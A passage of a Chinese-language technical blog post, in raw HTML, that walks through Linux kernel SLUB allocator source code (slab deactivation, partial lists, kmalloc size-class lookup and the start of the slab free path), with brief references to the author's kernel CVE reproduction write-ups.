class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode == M_PARTIAL) &#123;</span><br><span class="line">add_partial(n, slab, tail);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, tail);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == M_FREE) &#123;</span><br><span class="line">stat(s, DEACTIVATE_EMPTY);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == M_FULL_NOLIST) &#123;</span><br><span class="line">stat(s, DEACTIVATE_FULL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里简单提一下<code>deacticate_slab</code>函数的逻辑，遍历<code>freelist</code>检查是否被破坏，放弃被破坏的部分，将<code>slab-&gt;freelist</code>设为原<code>kmem_cache_cpu-&gt;freelist</code>，若slab上原有freelist不为 NULL 则再接到后面，设置 slab 的 counters，其中将 <code>frozen</code> 设为 0，若 slab 上的对象全部空闲且 node 的 partial slab 数量大于 <code>kmem_cache-&gt;min_partial</code>，调用 <code>discard_slab()</code> 将 slab 释放，若 slab 上存在空闲对象，调用 <code>add_partial()</code> 将其加入 node 的 partial 链表。这里的操作在 <a class="link"   href="https://cv196082.gitee.io/2023/10/27/CVE-2022-2588/" >CVE-2022-2588复现<i class="fas fa-external-link-alt"></i></a> 里面的<code>CVE-2023-3269</code>中使用过。</p><p>接下来进入<code>new_object</code>标签内，若是<code>percpu partial</code>链表也为空，便会进入到这个标签内。这里首先会分配一个新的slab并设置<code>partial_context</code>，调用<code>get_partial</code>尝试从当前node的<code>kmem_cache_node</code>的<code>partial</code>链表中分配一个slab，若成功则直接跳转到<code>check_new_slab</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">get_partial</span><span class="params">(struct kmem_cache *s, <span class="keyword">int</span> node, struct partial_context *pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"><span class="keyword">int</span> searchnode = node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">searchnode = numa_mem_id();</span><br><span class="line"></span><br><span class="line">object = get_partial_node(s, get_node(s, searchnode), pc);</span><br><span class="line"><span class="keyword">if</span> (object || node != NUMA_NO_NODE)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_any_partial(s, pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果node的为<code>NUMA_NO_NODE</code>则会调用<code>get_any_partial</code>尝试从其他的node的<code>kmem_cache_node</code>中分配。如果<code>get_partial</code>函数没能从node的<code>kmem_cache_node</code>中获得slab的话则会调用<code>new_slab</code>向<code>buddy system</code>申请一份新的slab。</p><p>在拿到<code>slab</code>之后继续往后面走会先判断是否有<code>SLAB_DEBUG_FLAGS</code>标识位，如果有则调用<code>alloc_single_from_new_slab</code>函数，从新分配的<code>slab</code>中获取一个对象之后放回<code>partial</code>&#x2F;<code>full</code>中，如果失败则退出，成功返回。若是没有设置<code>SLAB_DEBUG_FLAGS</code>这个标识位，那就获取slab的<code>freelist</code>随后调用<code>inc_slabs_node</code>函数给node的引用计数增加。</p><p>接下来看<code>check_new_slab</code>标签，这里面做的事比较少，首先则是检查该<code>kmem_cache</code>是否设置了<code>SLAB_DEBUG_FLAGS</code>标识位，然后检查是否设置了<code>SLAB_STORE_USER</code>标识位，随后返回<code>freelist</code>。如果没有设置则调用<code>pfmemalloc_match</code>检查slab与分配标识位是否不匹配，如果不匹配则调用<code>deactivate_slab</code>禁用slab并返回<code>freelist</code>。</p><p>最后就是<code>retry_load_slab</code>标签，这里就是尝试加载新获得的slab，如果<code>percpu slab</code>不为NULL，那么这里就将其和<code>freelist</code>设置为NULL，随后调用<code>deactivate_slab</code>禁用slab并获取下一个tid，最后将新获得的slab设置到<code>percpu slab</code>随后跳转到<code>load_freelist</code>分配对象并返回。</p><h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h3><p>前面主要是slub算法的核心逻辑，下面来对象分配更上级的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline __alloc_size(<span class="number">1</span>) <span class="function"><span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"><span class="keyword">return</span> kmalloc_trace(</span><br><span class="line">kmalloc_caches[kmalloc_type(flags, _RET_IP_)][index],</span><br><span class="line">flags, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的逻辑很简单，首先看size为编译预知的，如果不是则直接调用<code>__kmalloc</code>。如果是则进入内部，首先会判断size是否大于<code>KMALLOC_MAX_CACHE_SIZE</code>如果是则直接调用<code>kmalloc_large</code>进行分配并返回，如果不是则调用<code>kmalloc_index</code>函数获取到索引随后使用<code>kmalloc_trace</code>函数进行分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__kmalloc_large_node(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = get_order(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))</span><br><span class="line">flags = kmalloc_fix_flags(flags);</span><br><span class="line"></span><br><span class="line">flags |= __GFP_COMP;</span><br><span class="line">page = alloc_pages_node(node, flags, order);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">ptr = page_address(page);</span><br><span class="line">mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,</span><br><span class="line">      PAGE_SIZE &lt;&lt; order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ptr = kasan_kmalloc_large(ptr, size, flags);</span><br><span class="line"><span class="comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span></span><br><span class="line">kmemleak_alloc(ptr, size, <span class="number">1</span>, flags);</span><br><span class="line">kmsan_kmalloc_large(ptr, size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc_large</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);</span><br><span class="line"></span><br><span class="line">trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),</span><br><span class="line">      flags, NUMA_NO_NODE);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_large);</span><br></pre></td></tr></table></figure><p>这里<code>kmalloc_large</code>最终会调用的是<code>__kmalloc_large_node</code>函数进行分配，可以看到其直接调用了<code>alloc_pages_node</code>向<code>buddy system</code>请求内存了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">unsigned</span> <span class="keyword">int</span> __kmalloc_index(<span class="keyword">size_t</span> size,</span><br><span class="line">    <span class="keyword">bool</span> size_is_constant)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line"><span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)</span><br><span class="line">BUILD_BUG_ON_MSG(<span class="number">1</span>, <span class="string">&quot;unexpected size in kmalloc_index()&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">BUG();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kmalloc_index(s) __kmalloc_index(s, true)</span></span><br></pre></td></tr></table></figure><p>而<code>kmalloc_index</code>函数其实就是调用<code>__kmalloc_index</code>，其内部实现也是比较简单粗暴。</p><p>关于<code>kmalloc_type</code>函数在 <a class="link"   href="https://cv196082.gitee.io/2023/10/15/CVE-2022-0185/" >CVE-2022-0185复现<i class="fas fa-external-link-alt"></i></a> 文章中详细分析过了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmem_cache_alloc_node(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags,</span><br><span class="line">      <span class="keyword">int</span> node, <span class="keyword">size_t</span> orig_size,</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> slab_alloc_node(s, <span class="literal">NULL</span>, gfpflags, node,</span><br><span class="line">       caller, orig_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc_trace</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,</span><br><span class="line">    size, _RET_IP_);</span><br><span class="line"></span><br><span class="line">trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);</span><br><span class="line"></span><br><span class="line">ret = kasan_kmalloc(s, ret, size, gfpflags);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_trace);</span><br></pre></td></tr></table></figure><p><code>kmalloc_trace</code>就是对<code>__kmem_cache_alloc_node</code>函数的调用，而<code>__kmem_cache_alloc_node</code>其实就是对<code>slab_alloc_node</code>的wrapper，前面也已经分析过<code>slab_alloc_node</code>了，不过需要注意的是这里指定了node为<code>NUMA_NO_NODE</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure><p>这里<code>__kmalloc</code>也是直接调用了<code>__do_kmalloc_node</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline</span><br><span class="line"><span class="keyword">void</span> *__do_kmalloc_node(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;</span><br><span class="line">ret = __kmalloc_large_node(size, flags, node);</span><br><span class="line">trace_kmalloc(caller, ret, size,</span><br><span class="line">      PAGE_SIZE &lt;&lt; get_order(size), flags, node);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = kmalloc_slab(size, flags, caller);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">ret = __kmem_cache_alloc_node(s, flags, node, size, caller);</span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line">trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑在开头位置同上，如果size大于<code>KMALLOC_MAX_CACHE_SIZE</code>那么就直接调用<code>__kmalloc_large_node</code>进行分配。如果小于的话则贤调用<code>kmalloc_slab</code>寻找到对应的<code>kmem_cache</code>然后调用<code>__kmem_cache_alloc_node</code>进行分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags, <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">index = size_index[size_index_elem(size)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">index = fls(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags, caller)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里寻找的方式也和前面的十分相似，<code>size_index</code>和<code>size_index_elem</code>的实现也是比较粗暴。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> u8 size_index[<span class="number">24</span>] __ro_after_init = &#123;</span><br><span class="line"><span class="number">3</span>,<span class="comment">/* 8 */</span></span><br><span class="line"><span class="number">4</span>,<span class="comment">/* 16 */</span></span><br><span class="line"><span class="number">5</span>,<span class="comment">/* 24 */</span></span><br><span class="line"><span class="number">5</span>,<span class="comment">/* 32 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 40 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 48 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 56 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 64 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 72 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 80 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 88 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 96 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 104 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 112 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 120 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 128 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 136 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 144 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 152 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 160 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 168 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 176 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 184 */</span></span><br><span class="line"><span class="number">2</span><span class="comment">/* 192 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">size_index_elem</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (bytes - <span class="number">1</span>) / <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象的释放"><a href="#对象的释放" class="headerlink" title="对象的释放"></a>对象的释放</h2><h3 id="do-slab-free"><a href="#do-slab-free" class="headerlink" title="do_slab_free"></a>do_slab_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">do_slab_free</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab, <span class="keyword">void</span> *head, <span class="keyword">void</span> *tail,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> cnt, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *tail_obj = tail ? : head;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"><span class="keyword">void</span> **freelist;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the currently cpus per cpu slab.</span></span><br><span class="line"><span class="comment"> * The cpu may change afterward. However that does not matter since</span></span><br><span class="line"><span class="comment"> * data is retrieved via this pointer. If we are on the same cpu</span></span><br><span class="line"><span class="comment"> * during the cmpxchg then the free will succeed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">tid = READ_ONCE(c-&gt;tid);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same with comment on barrier() in slab_alloc_node() */</span></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;</span><br><span class="line">__slab_free(s, slab, head, tail_obj, cnt, addr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;</span><br><span class="line">freelist = READ_ONCE(c-&gt;freelist);</span><br><span class="line"></span><br><span class="line">set_freepointer(s, tail_obj, freelist);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!__update_cpu_freelist_fast(s, freelist, head, tid))) &#123;</span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_free&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Update the free list under the local lock */</span></span><br><span class="line">local_lock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line">c = this_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;</span><br><span 